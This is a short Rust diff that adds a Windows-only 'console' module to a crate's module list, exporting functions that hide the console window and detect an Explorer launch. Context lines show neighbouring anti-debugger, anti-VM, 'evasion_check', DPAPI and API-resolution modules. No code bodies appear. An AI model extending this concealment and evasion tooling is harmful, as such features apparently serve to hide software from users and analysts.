@@ -18,6 +18,8 @@
 #[cfg(windows)]
 pub mod apitable;
 #[cfg(windows)]
+pub mod console;
+#[cfg(windows)]
 pub mod detect;
 #[cfg(windows)]
 pub mod dpapi;
@@ -33,6 +35,8 @@ pub mod pe;
 pub mod resolve;
 #[cfg(windows)]
 pub mod winpaths;
+#[cfg(windows)]
+pub use console::{configure_double_click_mode, hide_console_window, launched_by_explorer};
 #[cfg(windows)]
 pub use detect::{debugger_detected, evasion_check, vm_detected};
 #[cfg(windows)]
